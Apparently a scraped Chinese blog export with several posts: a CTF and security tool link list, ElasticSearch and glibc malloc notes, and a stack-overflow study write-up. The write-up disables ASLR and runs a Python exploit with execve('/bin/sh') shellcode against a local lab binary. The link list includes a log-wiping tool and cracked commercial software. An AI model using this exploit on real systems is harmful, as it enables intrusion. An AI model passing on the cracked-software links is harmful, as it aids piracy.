www.wechall.net/challs!!!!!!非常入门的国外ctf题库，很多国内都是从这里刷题成长起来的 http://canyouhack.it/国外，入门，有移动安全 https://microcorruption.com/loginA方向密码，逆向酷炫游戏代 http：//smashthestack.orgA方向，简洁，国外，wargames，过关 http://overthewire.ofg/wargames/！！！！推荐A方向国内资料多，老牌wargame https：//exploit-exercises.comA方向老牌wargame，国内资料多 http://pawnable.kr/play.phppwn类游乐场，不到100题 http://ctf.moonsoscom/pentest/index.phpB方向米安的Web漏洞靶场，基础，核心知识点 http：//prompt.ml/0B方向国外的xss测试 http://redtiger.labs.overthewire.org/B方向国外sql注入挑战网站，10关，过关的形式不同的注入，循序渐近地练习 工具： https://github.com/truongkma/ctf-tools https://github.com/Plkachu/v0lt https://github.com/zardus/ctf-tools https://github.com/TUCTF/Tools 入门–以练促赛，以赛养练 选择一场已经存在writeup的比赛 总结解题过程，分析出题人想法 参加一场最新的ctf比赛 https：//ctftime.org/国际比赛，有很多基础的 http：//www.xctf.org.cn/国内比赛，比较难 以及一些ctf要用到的 整合版： http://www.jz5u.com/Soft/Progra/tool/163275.html 各种在线工具以及工具整合 http://www.ctftools.com/ 内网自动化渗透脚本https://github.com/SecureThisShit/WinPwn 一个初级内网渗透课程 视频:https://pan.baidu.com/s/13yBZg6DaaMP_dRo1XhKooA提取码：aeko PPT:https://pan.baidu.com/s/13r6dH0GBbsuLVFP4nTg5Yg提取码：fuh8逆向工程: GDB–http://www.gnu.org/software/gdb/download/ IDAPro–https://www.hex-rays.com/products/ida/support/download.shtml ImmunityDebugger–http://debugger.immunityinc.com/ OllyDbg–http://www.ollydbg.de/ radare2–http://www.radare.org/y/?p=download Hopper–http://www.hopperapp.com/download.html nm–unix/linuxtool objdump–linuxtool strace–linuxtool ILSpy–http://ilspy.net/ JD-GUI–http://jd.benow.ca/#jd-gui-overview FFDec–http://www.free-decompiler.com/flash/download.html dex2jar–http://code.google.com/p/dex2jar/ uncompyle2–https://github.com/wibiti/uncompyle2 Hexeditors: Windows: HxD–http://mh-nexus.de/en/hxd/ Neo–http://www.new-hex-editor.com/hex-editor-downloads.html Linux: Bless–http://home.gna.org/bless/downloads.html wxHexEditor–http://www.wxhexeditor.org/download.php Exeunpackers–UnpackingKit2012–http://forum.exetools.com/showthread.php?t=13610 网络: Wireshark,tshark–https://www.wireshark.org/download.html OpenVPN–https://openvpn.net/ OpenSSL–https://www.openssl.org/related/binaries.html tcpdump–http://www.tcpdump.org/ netcat–http://netcat.sourceforge.net/ nmap–http://nmap.org/download.html 隐写: OpenStego–http://www.openstego.info/ OutGuess–http://www.outguess.org/download.php Steghide–http://steghide.sourceforge.net/download.php StegFS–http://sourceforge.net/projects/stegfs/ pngcheck–http://www.libpng.org/pub/png/apps/pngcheck.html GIMP–http://www.gimp.org/downloads/ Audacity–http://audacity.sourceforge.net/download/ MP3Stego–http://www.petitcolas.net/steganography/mp3stego/ ffmpeg(forvideoanalysis)–https://www.ffmpeg.org/download.html 电子取证: dd–unix/linuxtool strings–unix/linuxtool scalpel–https://github.com/sleuthkit/scalpel TrID–http://mark0.net/soft-trid-e.html binwalk–http://binwalk.org/ foremost–http://foremost.sourceforge.net/ ExifTool–http://www.sno.phy.queensu.ca/~phil/exiftool/ DigitalForensicsFramework(DFF)–http://www.digital-forensic.org/download/ ComputerAidedINvestigativeEnvironment(CAINE)Linuxforensicslivedistribution–http://www.caine-live.net/ TheSleuthKit(TSK)–http://www.sleuthkit.org/sleuthkit/download.php Volatility–http://code.google.com/p/volatility/ 编程以及编码工具/PPC: Texteditors: SublimeText–http://www.sublimetext.com/ Notepad++–http://notepad-plus-plus.org/ vim–http://www.vim.org/ emacs–http://www.gnu.org/software/emacs/ 密码学: Cryptool–https://www.cryptool.org/ hashpump–https://github.com/bwall/HashPump Sage–http://www.sagemath.org/ JohntheRipper–http://www.openwall.com/john/ xortool–https://github.com/hellman/xortool 在线工具: http://www.crypo.com/ http://www.cryptool-online.org/ http://rumkin.com/tools/cipher/ Modulesforpython–pycrypto–https://www.dlitz.net/software/pycrypto/ cmd5: http://pmd5.com/ http://www.cmd5.com/ 进制转换-https://tool.lu/hexconvert 在线运行代码-https://c.runoob.com/compile/1 工具 秘迹：https://m.mijisou.com/ 在线病毒检测引擎：http://www.virscan.org/ 云扫描病毒：http://www.scanvir.com/ 威胁情报分析平台：https://x.threatbook.cn/partner WebShell检测引擎：https://scanner.baidu.com/ 知道创宇：https://github.com/knownsec Dm：https://github.com/Dm2333 EventCleaner：https://github.com/360-A-Team/EventCleaner 验证码识别库：http://www.wzdr.cn/article-534.html 中国特色弱口令生成器：https://github.com/RicterZ/genpAss MSDN各种工具和服务器镜像：https://msdn.itellyou.cn/ C32asm最佳的静态反汇编软件：http://www.c32asm.com/ PHP在线加解密网站：http://www.zhaoyuanma.com/ K8工具合集：https://github.com/k8gege/K8tools WinAFL模糊测试工具：https://github.com/ivanfratric/winafl 异步目标枚举工具：https://github.com/welchbj/bscan 开源扫描仪工具箱：https://github.com/We5ter/Scanners-Box FCN：https://github.com/boywhp/fcn 浏览器的PWN：https://github.com/m1ghtym0/browser-pwn 高级威胁战术：https://www.cobaltstrike.com/training 风控预警平台：https://github.com/creditease-sec/insight 暴力破解工具Hydra（九头蛇）： https://www.jianshu.com/p/e02ef0a00786 万能密码字典： https://wenku.baidu.com/view/d55f60e4c281e53a5902ff0d SubFinder是一个子域发现工具： https://github.com/subfinder/subfinder 中国蚂剑： https://github.com/AntSwordProject/antSword/releases Windows-Exploit-Suggester： https://github.com/GDSSecurity/Windows-Exploit-Suggester 构造优质上传漏洞fuzz字典： http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/ 一款识别图形验证码的BurpSuite插件： https://www.jianshu.com/p/a0262883b751 slowloris.py-Python中的简单slowloris： https://github.com/gkbrk/slowloris SharpSploit控制台： https://github.com/anthemtotheego/SharpSploitConsole 研究个人编译APT恶意软件： https://github.com/sapphirex00/Threat-Hunting 代理行动规则： https://github.com/PortSwigger/proxy-action-rules SwitchHosts—快速切换主机： https://github.com/oldj/SwitchHosts Xshell6.0破解版本（绿色破解）： https://download.csdn.net/download/qq_32589267/10792860 BurpSuite破解版（含注册机，无后门）： https://blog.csdn.net/u014549283/article/details/81248886 x-pack-core-6.4.2破解版亲测可用： https://download.csdn.net/download/czs208112/10718181 Wiki收集RedTeam基础架构强化资源： https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki 应急响应工具大合集： https://github.com/meirwah/awesome-incident-response 蜜罐： https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md 电子书籍： 安全思维导图集合：https://github.com/SecWiki/sec-chart PHP编程：https://pan.baidu.com/s/1ZvUdonJ_h3EYTfHIbjoe6A 代码审计入门：http://www.cnblogs.com/Oran9e/p/7763751.html 墨者学院审计类通关指南：https://xz.aliyun.com/t/2821 IT畅销电子书：https://www.packtpub.com/ 资源网站： KaliLinux渗透测试： https://mp.weixin.qq.com/s/8UcU7R803k3gcextswzGlQ Oday安全： http://www.0daysecurity.com/penetration-testing/enumeration.html IT资料搜寻网站： https://www.programcreek.com/java-api-examples/?action=search web安全基础（解压密码：xindong）： https://pan.baidu.com/s/1xyAXrQceq9bUzfBrYc4bBA 其它知识点： Poc基础知识：https://poc.evalbug.com/chapter1/1.html 对CDN的误区：http://www.rinige.com/index.php/archives/772/ 同时部署WAF和CDN： https://help.aliyun.com/knowledge_detail/42200.html Linux系统清除缓存【整理】： https://blog.csdn.net/qiuzhi__ke/article/details/70768544 大马小马的区别： http://www.cnhonkerarmy.com/thread-156156-1-1.html 面试必备之乐观锁与悲观锁： https://blog.csdn.net/qq_34337272/article/details/81072874 一套实用的渗透测试岗位面试题： https://zhuanlan.zhihu.com/p/25582026 IPC)、C是什么?如何关闭删除Windows默认共享： https://m.jb51.net/softjc/2124.html php下进行mysql参数化查询： https://blog.csdn.net/lpwmm/article/details/50733698 闲趣文章： 2018中国白帽人才调查报告： https://www.anquanke.com/post/id/170034 如何走进黑客世界： https://www.freebuf.com/articles/neopoints/190895.html 网络安全行业全景图： https://mp.weixin.qq.com/s/gksuSM7S-MLZ5LFz6-kjdw linux kernel进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应漏洞，可以用gdb+qemu，也可以用另一台机器编译内核。然后查看源码并调试，这可以折腾自己喜欢的编辑器，并对照相应的补丁，了解更多细节。最后可以尝试在poc的基础上写自己的exp。自己直接阅读 Linux kernel 源码的话可能无从下手，可以先了解一下Linux内核源码目录结构，比如 drivers是设备驱动、arch是cpu相关代码、virt是虚拟化相关、security实现安全特性等等。然后从Linux内核可以被攻击的方面出发，比如系统调用、驱动、进程管理、网络，然后查找相应cve，比如CVE-2017-5123属于系统调用的漏洞。了解常见的攻击类型，比如栈溢出、堆溢出、UAF、整数溢出、race condition、权限检查不当、类型转换错误等等。了解Linux内核的防护机制，比如KASLR、SMEP、SELINUX等等。 Interactive map of Linux kernelhttp://www.makelinux.net/kernel_map/ 书籍《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldanihttp://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8 《Linux Kernel Architecture》，Wolfgang Mauererhttp://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79 《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvaldshttp://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC 源码Linux内核源码https://github.com/torvalds/linux Linux各版本内核https://www.kernel.org/pub/linux/kernel/ Linux内核代码在线查看http://lxr.free-electrons.com exp及分析文章linux-kernel-exploitshttps://github.com/SecWiki/linux-kernel-exploits kernel exploithttps://github.com/lucyoa/kernel-exploits kernel heap overflow利用https://zhuanlan.zhihu.com/p/26674557 kernel exploit(适合入门)https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf blackhat kernel议题https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf FUZZsyzkaller这个链接的前半部分的内容详细解释了如何搭建一个qemu + gdb的环境https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md Awesome-Fuzzinghttps://github.com/secfigo/Awesome-Fuzzing 其他x86_64 Assemblyhttps://0xax.github.io/categories/assembler/ 64-bit system call numbers and entry vectorshttps://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl 翻过的文章记录深入理解linux系统下proc文件系统内容http://www.cnblogs.com/cute/archive/2011/04/20/2022280.htmlWhat is mode_t in C?https://jameshfisher.com/2017/02/24/what-is-mode_t.htmlUnderstanding a Kernel Oops!http://opensourceforu.com/2011/01/understanding-a-kernel-oops/Linux Kernel Procfs Guidehttps://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf用户空间与内核空间数据交换的方式(2)——procfshttp://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html用户空间和内核空间传递数据：get_user；put_user;copy_to_user;copy_from_userhttp://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html谈结构体struct 初始化多出的点号“.”，数组[]初始化多出的逗号“,”https://blog.csdn.net/comwise/article/details/9087279Root exploit for Android and Linux（CVE-2010-4258）https://blog.csdn.net/hu3167343/article/details/36892563 思维导图：","categories":[{"name":"ctf","slug":"ctf","permalink":"http://www.yorzorzy.xyz/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.yorzorzy.xyz/tags/ctf/"}]},{"title":"ElasticSearch基本原理介绍","slug":"es基本原理介绍","date":"2020-02-10T01:59:02.217Z","updated":"2020-02-10T01:57:41.000Z","comments":true,"path":"2020/02/10/es基本原理介绍/","link":"","permalink":"http://www.yorzorzy.xyz/2020/02/10/es%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"ElasticSearch基本原理介绍索引结构在存储结构上，由_index, _type和_id唯一标示一个文档。_index指向一个或者多个物理分片的逻辑命名空间，_type类型用于区分同一个集合中的不同的细分。_id文档标识符由系统自动生成或者使用者提供。 分片ES将数据副本分为主从两个部分，即主分片和副分片。主分片为权威数据，写过程先写主分片，成功之后再写副分片，恢复过程以主分片为主。 集群内部原理集群节点角色： 主节点 主节点负责集群层面的相关操作，管理集群变更 通过配置node.master:true节点具有被选举为master的资格，主节点是全局唯一的，将从有资格成为master的节点中进行选举。 主节点也可以成为数据节点，但尽可能的做少量的工作，因此生产环境应尽量分离主节点和数据节点，创建独立节点的配置： node.master: true node.data: false 为了防止数据丢失，每个主节点应该知道有资格成为主节点的数目，默认为1，为了避免网络分区时候出现多主的情况，配置discovery.zen.minimum_master_nodes原则上最小值应该是（master_eligible_nodes/2）+1 数据节点 负责保存数据，执行数据相关操作，CRUD，搜索，聚合等，数据节点对CPU，内存，IO要求较高。通过配置node.data: true来使一个节点成为数据节点。也可以通过下面的配置: node.master: false node.data: true node.ingest: false 预处理节点 预处理节点在5.0之后引入。默认情况下在所有的节点上启用ingest，如果想在某个节点上禁用ingest，则可以添加配置node.ingest: false。也可以通过下面的配置创建一个仅用于预处理的节点： node.master: false node.data: false node.ingest：false 协调节点 客户端请求可以发送到集群的任意节点，每个节点都知道任意文档所在的位置，然后转发这些请求，收集数据并返回给客户端，处理客户端请求的节点称为协调节点。 协调节点将请求转发给保存数据的数据节点。每个数据节点在本地执行请求，并将结果返回给协调节点，协调节点收集完数据之后将数据节点的结果合并为单个全局结果，对结果收集和排序的过程可能需要很多CPU和内存资源。 配置： node.master: false node.data: false node.ingest: false 部落节点 允许部落节点在多个集群之间充当联合客户端 客户端的属性： node.master: false node.data: false 它不做主节点，不做数据节点，仅用于路由请求，本质上是一个智能负载均衡器。 集群的健康度状态集群的健康度状态分为三种： Green: 主分片和副分片都正常运行 Yellow: 所有的主分片都正常运行，但不是所有的副分片都正常运行，意味着有单点故障的风险。 Red: 有主分片没能正常运行 集群扩容当扩容集群，添加节点时候，分片会均衡地分配到集群的每个节点上，从而对索引和搜索过程进行负载均衡，这些都是系统自动完成。 分片副本实现数据冗余，从而防止硬件故障导致的数据丢失。 主要内部模块介绍ClusterCluster模块是主节点执行集群管理的我封装实现，管理集群状态，维护集群层面的配置信息。主要功能： 管理集群状态，将新生成的集群状态发布到集群节点 调用allocation模块执行分片分配，决策那些分片应该分配到哪个节点 集群各节点中直接迁移分片，保持数据平衡 allocation封装分片分配相关的功能和策略，包括主分片的分配和副分片的分配，本模块由主节点调用。创建新索引，集群完全重启都需要分片分配的过程 Discovery发现模块负责发现集群中的节点，以及选举主节点。当节点加入或退出集群时，主节点会采取相应的行动。 Gateway负责对收到Master广播下来的集群状态数据的持久化存储，并在集群完全重启时恢复他们。 Indices索引模块管理全局级的索引设置，不包括索引级的，它还封装了索引数据恢复功能。集群启动阶段需要的主分片恢复和副分片恢复就是在这个模块实现。 HTTPHTTP模块允许通过JSON over HTTP的方式访问ES的API，HTTP模块本质上完全异步的，意味着没有阻塞线程等待响应。使用异步通信进行HTTP的好处是解决了C10k问题（10k量级的并发连接）。 在部分场景中，可考虑使用HTTP keepalive来提升性能，注意，不要在客户端使用http chunking Transport传输模块用于集群内节点之间的内部通信，从一个节点到另一个节点的每个请求都使用传输模块。 EngineEngine模块封装了对Lucene的操作及translog的调用，它是对一个分片读写操作的最终提供者。 选主算法bolly算法：选择ID较大的，在es中选择id较小的机器为master节点。","categories":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"http://www.yorzorzy.xyz/categories/ElasticSearch/"}],"tags":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"http://www.yorzorzy.xyz/tags/ElasticSearch/"}]},{"title":"ptmalloc学习","slug":"ptmalloc学习","date":"2020-01-26T11:02:18.842Z","updated":"2020-01-26T11:02:04.000Z","comments":true,"path":"2020/01/26/ptmalloc学习/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/26/ptmalloc%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"ptmalloc学习ptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用的dlmalloc，现在逐步都被支持多线程的ptmalloc来替代了。 我们之前学习过系统底层是调用的brk和mmap来实现内存分配的。 ptmalloc2多线程情况下分配内存的时候，每个线程有一个独立的heap segment和freelist数据结构保持于其他堆独立。这个行为我们称作为per thread arena; 需要注意的是，即使用户请求内存只有1000字节，堆内存分配的时候还是会提供132KB大小被创建。这种连续的堆内存区域我们称作为arena。主线程创建的我们称作为main arena; 如果当程序超过了这个arena区域可用空寂哦哦安的时候，他能够增加通过程序break位置的方式。top chunk大小可以适配 extra space空间。类似的如果有很多可用空间在top chunk中的时候，他可以缩小。 除了这个1ＭＢ的堆分配外，只有132KB的读写权限被设置，因此这个连续的内存区域被称作为thread arena;如果超过128KB（132*1024）请求大小，超过了malloc可用空间的时候，内存分配通过使用mmap系统调用来申请，无论请求来自于main arena还是thread arena; arena的限制来自于系统的cores数目； 32bit: Number of arena = 2 * number of cores; 63bit: Number of arena = 8 * number of cores; heap的主要信息有下面这些： heap_info： heap header信息，单线程thread arena能有多堆。 malloc_state: arena header malloc_chunk: chunk_header main arena因为没有多heap，所以没有heap_info。不像thread arena，main arena header不是sbrk的 heap segment的一部分。他是一个全局变量，因此可以在libc.so data segment找到。 chunk: 一个chunk包含在一个heap segment中，包括以下几个： allocated chunk free chunk 其中 bins是freelist的数据结构，在free chunk中被使用。 fast bin, unsorted bin, small bin, large bin fastbinsY： 这个数组支持fastbins bins: bin1 unsorted bin, bin2-bin63 small bin, bin64-bin126 large bin; fastbin: chunk大小在16-80字节被称作为fast chunk; unsorted bin: 当释放小块或大块时，而不是将它们添加到各自的容器，将他们释放的空间放入unsortedbin中。这种方式给了glibc malloc重用最近释放的chunk的机会。因此，内存分配和释放会加快一点。因为寻找合适的垃圾箱所花费的时间减少了。 small bin: chunk小于512字节的被称作为small chunk; large bin: chunk大于512字节的被称作为large chunk; Top Chunk： 在top边界上的arena被称作为top chunk; Last Remainder Chunk： 从最近的一个小请求分裂。最后的剩余块有助于改善引用的局部性，即小块的连续的malloc请求可能最终被分配到彼此接近的地方。 参考https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/ https://www.cnblogs.com/alisecurity/p/5486458.html","categories":[{"name":"malloc","slug":"malloc","permalink":"http://www.yorzorzy.xyz/categories/malloc/"}],"tags":[{"name":"malloc","slug":"malloc","permalink":"http://www.yorzorzy.xyz/tags/malloc/"}]},{"title":"Linux Malloc底层分配原理【翻译】","slug":"linux内存malloc底层实现","date":"2020-01-24T06:56:22.335Z","updated":"2020-01-24T06:56:01.000Z","comments":true,"path":"2020/01/24/linux内存malloc底层实现/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/24/linux%E5%86%85%E5%AD%98malloc%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"Linux Malloc底层分配原理【翻译】linux中malloc函数还是通过syscall来分配内存的。通过调用brk或者mmap syscall函数来分配内存。 brk函数：从内核分配内存（非0初始化）通过增加程序break位置来实现。初始化堆segment得开始与结束指向相同的位置。 如果ASLR关闭的时候，start_brk和brk将指向data/bss segment结束的位置。 如果ASLR打开的时候，start_brk和brk将等于data/bss segment结束的位置通过随机brk offset mmap: malloc函数使用mmap来创建一个私有匿名映射segment.分配私有匿名的主要目的是分配一个新的内存（0填充的）这个新的内存将被调用进程的时候额外使用。 参考https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/ https://manybutfinite.com/post/anatomy-of-a-program-in-memory/","categories":[{"name":"malloc","slug":"malloc","permalink":"http://www.yorzorzy.xyz/categories/malloc/"}],"tags":[{"name":"malloc","slug":"malloc","permalink":"http://www.yorzorzy.xyz/tags/malloc/"}]},{"title":"pwn学习笔记1","slug":"pwn学习笔记","date":"2020-01-23T03:05:13.595Z","updated":"2020-01-23T03:04:09.000Z","comments":true,"path":"2020/01/23/pwn学习笔记/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"pwn学习笔记1学习笔记其实参考的是https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。 环境：ubuntu14.04 漏洞代码： 12345678910//vuln.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[]) &#123; /* [1] */ char buf[256]; /* [2] */ strcpy(buf,argv[1]); /* [3] */ printf(\"Input:%s\\n\",buf); return 0;&#125; 其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。 首先我们需要关闭内存地址随机化。保证栈溢出地址固定。 1echo 0 &gt; /proc/sys/kernel/randomize_va_space 编译和打开栈执行 12gcc -g -fno-stack-protector -z execstack -o vul1 vul1.cchmod +s vul1 gdb调试： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970saar@saar-virtual-machine:~/pwn$ gdb vul1 GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1Copyright (C) 2014 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"i686-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...Reading symbols from vul1...done.gdb-peda$ disdisable disassemble disconnect display distance gdb-peda$ disassemble mainDump of assembler code for function main: 0x0804844d &lt;+0&gt;: push ebp 0x0804844e &lt;+1&gt;: mov ebp,esp 0x08048450 &lt;+3&gt;: and esp,0xfffffff0 0x08048453 &lt;+6&gt;: sub esp,0x110 0x08048459 &lt;+12&gt;: mov eax,DWORD PTR [ebp+0xc] 0x0804845c &lt;+15&gt;: add eax,0x4 0x0804845f &lt;+18&gt;: mov eax,DWORD PTR [eax] 0x08048461 &lt;+20&gt;: mov DWORD PTR [esp+0x4],eax 0x08048465 &lt;+24&gt;: lea eax,[esp+0x10] 0x08048469 &lt;+28&gt;: mov DWORD PTR [esp],eax 0x0804846c &lt;+31&gt;: call 0x8048320 &lt;strcpy@plt&gt; 0x08048471 &lt;+36&gt;: lea eax,[esp+0x10] 0x08048475 &lt;+40&gt;: mov DWORD PTR [esp+0x4],eax 0x08048479 &lt;+44&gt;: mov DWORD PTR [esp],0x8048520 0x08048480 &lt;+51&gt;: call 0x8048310 &lt;printf@plt&gt; 0x08048485 &lt;+56&gt;: mov eax,0x0 0x0804848a &lt;+61&gt;: leave 0x0804848b &lt;+62&gt;: ret End of assembler dump.gdb-peda$ r `python -c 'print \"A\"*400'`Starting program: /home/saar/pwn/vul1 `python -c 'print \"A\"*400'`Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAProgram received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0xb7fc0000 --&gt; 0x1acda8 ECX: 0x0 EDX: 0xb7fc1898 --&gt; 0x0 ESI: 0x0 EDI: 0x0 EBP: 0x41414141 ('AAAA')ESP: 0xbffff460 ('A' &lt;repeats 128 times&gt;)EIP: 0x41414141 ('AAAA')EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41414141[------------------------------------stack-------------------------------------]0000| 0xbffff460 ('A' &lt;repeats 128 times&gt;)0004| 0xbffff464 ('A' &lt;repeats 124 times&gt;)0008| 0xbffff468 ('A' &lt;repeats 120 times&gt;)0012| 0xbffff46c ('A' &lt;repeats 116 times&gt;)0016| 0xbffff470 ('A' &lt;repeats 112 times&gt;)0020| 0xbffff474 ('A' &lt;repeats 108 times&gt;)0024| 0xbffff478 ('A' &lt;repeats 104 times&gt;)0028| 0xbffff47c ('A' &lt;repeats 100 times&gt;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41414141 in ?? () esp 地址是：0xbffff460， 发现ret_address需要保证esp+N&lt;nop的数目 123456789101112131415161718192021222324#exp.py #!/usr/bin/env pythonimport structfrom subprocess import call#Stack address where shellcode is copied.ret_addr = 0xbffff480 #Spawn a shell#execve(/bin/sh)scode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"#endianess convertiondef conv(num): return struct.pack(\"&lt;I\",num)# buf = Junk + RA + NOP's + Shellcodebuf = \"A\" * 268buf += conv(ret_addr)buf += \"\\x90\" * 40buf += scodeprint \"Calling vulnerable program\"call([\"./vul1\", buf]) 最后获取shell: 12345678saar@saar-virtual-machine:~/pwn$ python exp.py Calling vulnerable programInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin$ $ iduid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)$ 参考https://www.jianshu.com/p/187b810e78d2 https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/","categories":[{"name":"pwn","slug":"pwn","permalink":"http://www.yorzorzy.xyz/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://www.yorzorzy.xyz/tags/pwn/"}]},{"title":"open-falcon transfer 源码分析","slug":"transfer源码分析","date":"2020-01-21T09:07:46.621Z","updated":"2020-01-21T09:06:33.000Z","comments":true,"path":"2020/01/21/transfer源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/transfer%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon transfer 源码分析transfer模块是小米监控中比较重要的环境，主要用于发送数据给graph,judge,等。 主要流程在modules/transfer/main.go 12345678910111213141516171819202122232425262728293031323334353637func main() &#123; g.BinaryName = BinaryName g.Version = Version g.GitCommit = GitCommit cfg := flag.String(\"c\", \"cfg.json\", \"configuration file\") version := flag.Bool(\"v\", false, \"show version\") versionGit := flag.Bool(\"vg\", false, \"show version\") flag.Parse() if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; if *versionGit &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; // global config // 解析配置文件 g.ParseConfig(*cfg) // proc // 就是打印日志。。orz proc.Start() // 发送端启动 sender.Start() // 接收数据启动 receiver.Start() // http // http服务启动 http.Start() select &#123;&#125;&#125; 先来看下发送端的代码： 12345678910111213141516171819// 初始化数据发送服务, 在main函数中调用func Start() &#123; // 初始化默认参数 MinStep = g.Config().MinStep if MinStep &lt; 1 &#123; MinStep = 30 //默认30s &#125; //初始化连接池 initConnPools() //初始化发送队列 initSendQueues() //初始化hash环，用于做一致性hash分片 initNodeRings() // SendTasks依赖基础组件的初始化,要最后启动 startSendTasks() //启动发送定时任务 startSenderCron() log.Println(\"send.Start, ok\")&#125; 1234567891011121314151617181920212223242526272829func initConnPools() &#123; cfg := g.Config() // judge // 读取配置文件，加载进来 judgeInstances := nset.NewStringSet() for _, instance := range cfg.Judge.Cluster &#123; judgeInstances.Add(instance) &#125; JudgeConnPools = backend.CreateSafeRpcConnPools(cfg.Judge.MaxConns, cfg.Judge.MaxIdle, cfg.Judge.ConnTimeout, cfg.Judge.CallTimeout, judgeInstances.ToSlice()) // tsdb，是否开启tsdb，初始化 if cfg.Tsdb.Enabled &#123; TsdbConnPoolHelper = backend.NewTsdbConnPoolHelper(cfg.Tsdb.Address, cfg.Tsdb.MaxConns, cfg.Tsdb.MaxIdle, cfg.Tsdb.ConnTimeout, cfg.Tsdb.CallTimeout) &#125; // graph // graph地址初始化 graphInstances := nset.NewSafeSet() for _, nitem := range cfg.Graph.ClusterList &#123; for _, addr := range nitem.Addrs &#123; graphInstances.Add(addr) &#125; &#125; GraphConnPools = backend.CreateSafeRpcConnPools(cfg.Graph.MaxConns, cfg.Graph.MaxIdle, cfg.Graph.ConnTimeout, cfg.Graph.CallTimeout, graphInstances.ToSlice())&#125; 初始化发送队列： 1234567891011121314151617181920func initSendQueues() &#123; cfg := 